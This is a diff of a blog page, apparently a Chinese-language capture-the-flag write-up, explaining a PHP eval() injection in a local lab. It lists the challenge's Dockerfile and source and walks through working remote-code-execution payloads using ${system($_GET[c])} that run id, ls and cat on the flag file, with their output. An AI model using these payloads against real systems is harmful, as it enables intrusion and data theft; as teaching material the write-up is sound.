-</span></span><span class="line"><span class="cl">        <span class="nv">$offset_seconds</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">3600</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nv">$current_utc_time</span> <span class="o">=</span> <span class="nx">gmdate</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$prediction_time</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="nx">strtotime</span><span class="p">(</span><span class="nv">$current_utc_time</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$offset_seconds</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prediction</span> <span class="o">=</span> <span class="nv">$prediction_time</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getTime</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;$time = date(&#34;&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span> <span class="o">.</span> <span class="s1">&#39;&#34;, strtotime(&#34;&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prediction</span> <span class="o">.</span> <span class="s1">&#39;&#34;));&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$time</span> <span class="o">:</span> <span class="s1">&#39;Something went terribly wrong&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// Example usage:
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$format</span> <span class="o">=</span> <span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$model</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TimeModel</span><span class="p">(</span><span class="nv">$format</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$model</span><span class="o">-&gt;</span><span class="na">getTime</span><span class="p">();</span> <span class="c1">// Output: Predicted time formatted according to $format
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div></details>
-<div class="danger-box">
-<strong>
-addslashes是一個函式，回傳在合格字元之前添加反斜線( \ )的字串，合格字元包括( ' 或是 " 或是 \ )
+</code></pre><h2 id=solution>Solution</h2><ol><li>建立容器: <code>docker build -t babyshell .</code></li><li>啟動容器: <code>docker run --name=babyshell --rm -p1337:80 -it babyshell</code></li><li>連線到port1337，打開網站，頂部顯示時間:2025-06-29 20:28:26，頁面顯示: 2025-06-29T20:28:26+00:00080</li><li>觀察source code</li></ol><details open><summary>Dockerfile 程式碼</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>FROM</span> <span class=nx>ubuntu</span><span class=o>:</span><span class=mf>20.04</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Ubuntu Mirror TW
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>RUN</span> <span class=nx>sed</span> <span class=s1>&#39;s@archive.ubuntu.com@free.nchc.org.tw@&#39;</span> <span class=o>-</span><span class=nx>i</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=nx>apt</span><span class=o>/</span><span class=nx>sources</span><span class=o>.</span><span class=k>list</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Setup user
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>RUN</span> <span class=nx>useradd</span> <span class=nx>www</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Install system packeges
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>RUN</span> <span class=nx>apt</span><span class=o>-</span><span class=nx>get</span> <span class=nx>update</span> <span class=o>&amp;&amp;</span> <span class=nx>apt</span><span class=o>-</span><span class=nx>get</span> <span class=nx>install</span> <span class=o>-</span><span class=nx>y</span> <span class=nx>supervisor</span> <span class=nx>nginx</span> <span class=nx>lsb</span><span class=o>-</span><span class=nx>release</span> <span class=nx>wget</span> <span class=nx>software</span><span class=o>-</span><span class=nx>properties</span><span class=o>-</span><span class=nx>common</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Add repos
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>RUN</span> <span class=nx>add</span><span class=o>-</span><span class=nx>apt</span><span class=o>-</span><span class=nx>repository</span> <span class=nx>ppa</span><span class=o>:</span><span class=nx>ondrej</span><span class=o>/</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>RUN</span> <span class=nx>apt</span><span class=o>-</span><span class=nx>get</span> <span class=nx>update</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Install PHP dependencies
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>RUN</span> <span class=nx>apt</span> <span class=nx>update</span> <span class=o>&amp;&amp;</span> <span class=nx>apt</span> <span class=nx>install</span> <span class=nx>php7</span><span class=o>.</span><span class=mi>4</span><span class=o>-</span><span class=nx>fpm</span> <span class=o>-</span><span class=nx>y</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Configure php-fpm and nginx
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>COPY</span> <span class=nx>config</span><span class=o>/</span><span class=nx>fpm</span><span class=o>.</span><span class=nx>conf</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=nx>php</span><span class=o>/</span><span class=mf>7.4</span><span class=o>/</span><span class=nx>fpm</span><span class=o>/</span><span class=nx>php</span><span class=o>-</span><span class=nx>fpm</span><span class=o>.</span><span class=nx>conf</span>
+</span></span><span class=line><span class=cl><span class=nx>COPY</span> <span class=nx>config</span><span class=o>/</span><span class=nx>supervisord</span><span class=o>.</span><span class=nx>conf</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=nx>supervisord</span><span class=o>.</span><span class=nx>conf</span>
+</span></span><span class=line><span class=cl><span class=nx>COPY</span> <span class=nx>config</span><span class=o>/</span><span class=nx>nginx</span><span class=o>.</span><span class=nx>conf</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=nx>nginx</span><span class=o>/</span><span class=nx>nginx</span><span class=o>.</span><span class=nx>conf</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Copy challenge files
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>COPY</span> <span class=nx>challenge</span> <span class=o>/</span><span class=nx>www</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Copy flag
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>COPY</span> <span class=nx>flag</span> <span class=o>/</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Setup permissions
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>RUN</span> <span class=nx>chown</span> <span class=o>-</span><span class=nx>R</span> <span class=nx>www</span><span class=o>:</span><span class=nx>www</span> <span class=o>/</span><span class=nx>www</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nx>lib</span><span class=o>/</span><span class=nx>nginx</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Expose the port nginx is listening on
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>EXPOSE</span> <span class=mi>80</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Generate random flag filename and start supervisord
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>COPY</span> <span class=o>--</span><span class=nx>chown</span><span class=o>=</span><span class=nx>root</span> <span class=nx>entrypoint</span><span class=o>.</span><span class=nx>sh</span> <span class=o>/</span><span class=nx>entrypoint</span><span class=o>.</span><span class=nx>sh</span>
+</span></span><span class=line><span class=cl><span class=nx>ENTRYPOINT</span> <span class=p>[</span><span class=s2>&#34;/entrypoint.sh&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>CMD</span> <span class=p>[</span><span class=s2>&#34;/usr/bin/supervisord&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;/etc/supervisord.conf&#34;</span><span class=p>]</span>
+</span></span></code></pre></div></details><div class=warning-box><strong>程式解讀:
+28行: COPY flag / -> Flag 不在網站目錄 /www 下，而是在容器的根目錄 /</strong></div><details open><summary>entrypoint.sh 程式碼</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=c1># Secure entrypoint</span>
+</span></span><span class=line><span class=cl>chmod <span class=m>600</span> /entrypoint.sh
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>FLAG</span><span class=o>=</span><span class=k>$(</span>cat /dev/urandom <span class=p>|</span> tr -dc <span class=s1>&#39;a-zA-Z0-9&#39;</span> <span class=p>|</span> fold -w <span class=m>5</span> <span class=p>|</span> head -n 1<span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>mv /flag /flag<span class=nv>$FLAG</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span>
+</span></span></code></pre></div></details><div class=warning-box><strong>代表 flag 的檔名會隨機生成一個長度為5個字元的隨機字串，並將原本的 /flag 檔案重新命名為 /flag<隨機字串></strong></div><details open><summary>TimeModel.php 程式碼</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>TimeModel</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$format</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>format</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$format</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$offset_seconds</span> <span class=o>=</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>3600</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$current_utc_time</span> <span class=o>=</span> <span class=nx>gmdate</span><span class=p>(</span><span class=s1>&#39;Y-m-d H:i:s&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$prediction_time</span> <span class=o>=</span> <span class=nx>date</span><span class=p>(</span><span class=s1>&#39;Y-m-d H:i:s&#39;</span><span class=p>,</span> <span class=nx>strtotime</span><span class=p>(</span><span class=nv>$current_utc_time</span><span class=p>)</span> <span class=o>+</span> <span class=nv>$offset_seconds</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>prediction</span> <span class=o>=</span> <span class=nv>$prediction_time</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getTime</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;$time = date(&#34;&#39;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>format</span> <span class=o>.</span> <span class=s1>&#39;&#34;, strtotime(&#34;&#39;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>prediction</span> <span class=o>.</span> <span class=s1>&#39;&#34;));&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$time</span><span class=p>)</span> <span class=o>?</span> <span class=nv>$time</span> <span class=o>:</span> <span class=s1>&#39;Something went terribly wrong&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Example usage:
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$format</span> <span class=o>=</span> <span class=s1>&#39;Y-m-d H:i:s&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$model</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>TimeModel</span><span class=p>(</span><span class=nv>$format</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$model</span><span class=o>-&gt;</span><span class=na>getTime</span><span class=p>();</span> <span class=c1>// Output: Predicted time formatted according to $format
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div></details><div class=danger-box><strong>addslashes是一個函式，回傳在合格字元之前添加反斜線( \ )的字串，合格字元包括( ' 或是 " 或是 \ )
 舉例輸入 :
-system('cat flag') 會解讀成: system(\'cat flag\')
-</strong>
-</div>
-<div class="info-box">
-<strong>
-example:
-<p>code :</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;Who&#39;s Peter Griffin?&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$str</span> <span class="o">.</span> <span class="s2">&#34; This is not safe in a database query.&lt;br&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; This is safe in a database query.&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
-</span></span></span></code></pre></div><p>output :</p>
-<pre tabindex="0"><code class="language-text:" data-lang="text:">Who&#39;s Peter Griffin? This is not safe in a database query.
+system('cat flag') 會解讀成: system(\'cat flag\')</strong></div><div class=info-box><strong>example:<p>code :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$str</span> <span class=o>=</span> <span class=s2>&#34;Who&#39;s Peter Griffin?&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$str</span> <span class=o>.</span> <span class=s2>&#34; This is not safe in a database query.&lt;br&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$str</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34; This is safe in a database query.&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
+</span></span></span></code></pre></div><p>output :</p><pre tabindex=0><code class=language-text: data-lang=text:>Who&#39;s Peter Griffin? This is not safe in a database query.
 Who\&#39;s Peter Griffin? This is safe in a database query.
-</code></pre></strong>
-</div>
-<p>參考來源: <a href="https://www.runoob.com/php/func-string-addslashes.html">addslashes_fun</a></p>
-<div></div>
-<details open> <summary>TimeController.php 程式碼</summary>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TimeController</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nv">$router</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$format</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;format&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;format&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;chw&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$time</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TimeModel</span><span class="p">(</span><span class="nv">$format</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$router</span><span class="o">-&gt;</span><span class="na">view</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;time&#39;</span> <span class="o">=&gt;</span> <span class="nv">$time</span><span class="o">-&gt;</span><span class="na">getTime</span><span class="p">()]);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div></details>
-<p>第6~8行代表:</p>
-<ul>
-<li>可以透過 GET 參數 <code>format</code>傳入字串</li>
-<li>format 會傳進 <code>TimeModel</code> -&gt; 執行 <code>eval()</code> -&gt; RCE</li>
-</ul>
-<div class="warning-box">
-<strong>確認漏洞: RCE</strong> 
-</div>
-<ol start="5">
-<li>
-<p>測試payload</p>
-<ol>
-<li>要先測試 RCE 能夠成功
-<code>http://localhost:1337/?format=Y-m-d&quot;;system($_GET[c]);//&amp;c=id</code>
-- <code>date(&quot;Y-m-d&quot;)</code> 是正常的時間格式
-- <code>&quot;;system(...)</code> 關閉前面字串，插入PHP 函數
-- <code>//</code> 註解</li>
-</ol>
-<p>程式執行:</p>
-<p><code>eval('$time = date(&quot;Y-m-d&quot;;system($_GET[c]);// ...</code></p>
-<p>頂部輸出 :</p>
-<p><code>2025-06-29 20:29:15</code></p>
-<p>頁面輸出 :</p>
-<p><code>2025-06-29&quot;;15251530UTC06(2929);//</code></p>
- <div class = "fail">
-     RCE 失敗
- </div>
-<p><img src="https://hackmd.io/_uploads/ry-lMnA4ee.png" alt="image"></p>
-<ol start="2">
-<li>失敗原因思考</li>
-</ol>
-<ul>
-<li>format 傳入 &ldquo;Y-m-d&rdquo;;system($_GET[c]);//</li>
-<li>addslashes() 會將 (&quot; 或 &rsquo; 或 \ ) 轉義為 ( \ &quot; 或 \ &rsquo;  或\ \ ) -&gt;  變成 <code>Y-m-d\&quot;;system($_GET[c]);\/\/</code></li>
-<li>eval 語法錯誤
-<strong>需要繞過限制</strong></li>
-</ul>
-<ol start="3">
-<li>
-<p>更改payload</p>
-<p>輸入 :</p>
-<p><code>http://localhost:1337/?format=${system($_GET[c])}//&amp;c=id</code></p>
-<p>程式執行:
-<code>eval('$time = date(&quot;${system($_GET[c])}&quot;, strtotime(...));');</code></p>
-<ul>
-<li>
-<p><strong>在雙引號字串中使用 ${} 可以強制變數或函數的插值</strong>
+</code></pre></strong></div><p>參考來源: <a href=https://www.runoob.com/php/func-string-addslashes.html>addslashes_fun</a></p><div></div><details open><summary>TimeController.php 程式碼</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>TimeController</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>(</span><span class=nv>$router</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$format</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;format&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;format&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=s1>&#39;chw&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$time</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>TimeModel</span><span class=p>(</span><span class=nv>$format</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$router</span><span class=o>-&gt;</span><span class=na>view</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;time&#39;</span> <span class=o>=&gt;</span> <span class=nv>$time</span><span class=o>-&gt;</span><span class=na>getTime</span><span class=p>()]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div></details><p>第6~8行代表:</p><ul><li>可以透過 GET 參數 <code>format</code>傳入字串</li><li>format 會傳進 <code>TimeModel</code> -> 執行 <code>eval()</code> -> RCE</li></ul><div class=warning-box><strong>確認漏洞: RCE</strong></div><ol start=5><li><p>測試payload</p><ol><li>要先測試 RCE 能夠成功
+<code>http://localhost:1337/?format=Y-m-d";system($_GET[c]);//&amp;c=id</code>
+- <code>date("Y-m-d")</code> 是正常的時間格式
+- <code>";system(...)</code> 關閉前面字串，插入PHP 函數
+- <code>//</code> 註解</li></ol><p>程式執行:</p><p><code>eval('$time = date("Y-m-d";system($_GET[c]);// ...</code></p><p>頂部輸出 :</p><p><code>2025-06-29 20:29:15</code></p><p>頁面輸出 :</p><p><code>2025-06-29";15251530UTC06(2929);//</code></p><div class=fail>RCE 失敗</div><p><img src=https://hackmd.io/_uploads/ry-lMnA4ee.png alt=image></p><ol start=2><li>失敗原因思考</li></ol><ul><li>format 傳入 &ldquo;Y-m-d&rdquo;;system($_GET[c]);//</li><li>addslashes() 會將 (" 或 &rsquo; 或 \ ) 轉義為 ( \ " 或 \ &rsquo; 或\ \ ) -> 變成 <code>Y-m-d\";system($_GET[c]);\/\/</code></li><li>eval 語法錯誤
+<strong>需要繞過限制</strong></li></ul><ol start=3><li><p>更改payload</p><p>輸入 :</p><p><code>http://localhost:1337/?format=${system($_GET[c])}//&amp;c=id</code></p><p>程式執行:
+<code>eval('$time = date("${system($_GET[c])}", strtotime(...));');</code></p><ul><li><p><strong>在雙引號字串中使用 ${} 可以強制變數或函數的插值</strong>
 頂端輸出 :
 <code>2025-06-29 20:30:08uid=1000(www) gid=1000(www) groups=1000(www)</code>
-<img src="https://hackmd.io/_uploads/SkxGGnRNee.png" alt="image"></p>
-<p>-&gt;有點東西</p>
-</li>
-</ul>
-</li>
-<li>
-<p>但因為前面有說 <code>/flag</code> 會變成隨機字串，要先找出檔案名稱
-輸入 :</p>
-<p><code>http://localhost:1337/?format=${system($_GET[c])}//&amp;c=ls /</code></p>
-<p>頂端輸出 :</p>
-<p><code>2025-06-29 20:31:13bin boot dev entrypoint.sh etc flagV0JLH home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var www</code></p>
-<p>喔喔喔，<code>flagV0JLH</code> 抓到你了
-<img src="https://hackmd.io/_uploads/BJOQfnREel.png" alt="image"></p>
-</li>
-<li>
-<p>最後一步</p>
-<p>輸入 :</p>
-<p><code>http://localhost:1337/?format=${system($_GET[c])}//&amp;c=cat /flagV0JLH</code></p>
-<p>輸出 :</p>
-<p><code>2025-06-29 20:32:03CHW{7hi5_1s_f4k3_fl4g}</code></p>
-<p><img src="https://hackmd.io/_uploads/Sy3UzhA4lg.png" alt="image"></p>
-</li>
-</ol>
-</li>
-</ol>
-<h2 id="flag">Flag</h2>
-<div class="flag-box">
-<strong>
-flag : CHW{7hi5_1s_f4k3_fl4g}
-</strong>
-</div></article>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </main>
-</div>
-<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
-<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />
-
-  
-</div>
-
-  <div class="footer container-xl width-full p-responsive">
-  <div
-    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
-    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
-      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
-        <path fill-rule="evenodd"
-          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
-        </path>
-      </svg>
-    </a>
-    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
-      
-      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
-      
-      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
-    </ul>
-  </div>
-  <div class="d-flex flex-justify-center pb-6">
-    <span class="f6 text-gray-light"></span>
-  </div>
-
-
-</div>
-
-</body>
-
-<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>
-
-
-
-
-
-
-
-</html>
+<img src=https://hackmd.io/_uploads/SkxGGnRNee.png alt=image></p><p>->有點東西</p></li></ul></li><li><p>但因為前面有說 <code>/flag</code> 會變成隨機字串，要先找出檔案名稱
+輸入 :</p><p><code>http://localhost:1337/?format=${system($_GET[c])}//&amp;c=ls /</code></p><p>頂端輸出 :</p><p><code>2025-06-29 20:31:13bin boot dev entrypoint.sh etc flagV0JLH home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var www</code></p><p>喔喔喔，<code>flagV0JLH</code> 抓到你了
+<img src=https://hackmd.io/_uploads/BJOQfnREel.png alt=image></p></li><li><p>最後一步</p><p>輸入 :</p><p><code>http://localhost:1337/?format=${system($_GET[c])}//&amp;c=cat /flagV0JLH</code></p><p>輸出 :</p><p><code>2025-06-29 20:32:03CHW{7hi5_1s_f4k3_fl4g}</code></p><p><img src=https://hackmd.io/_uploads/Sy3UzhA4lg.png alt=image></p></li></ol></li></ol><h2 id=flag>Flag</h2><div class=flag-box><strong>flag : CHW{7hi5_1s_f4k3_fl4g}</strong></div></article></div></div></div></div></div></div></main></div><script type=application/javascript src=https://lyccyc.github.io/js/toc.js></script><link rel=stylesheet href=https://lyccyc.github.io/css/toc.css></div><div class="footer container-xl width-full p-responsive"><div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light"><a aria-label=Homepage title=GitHub class="footer-octicon d-none d-lg-block mr-lg-4" href=https://lyccyc.github.io/><svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 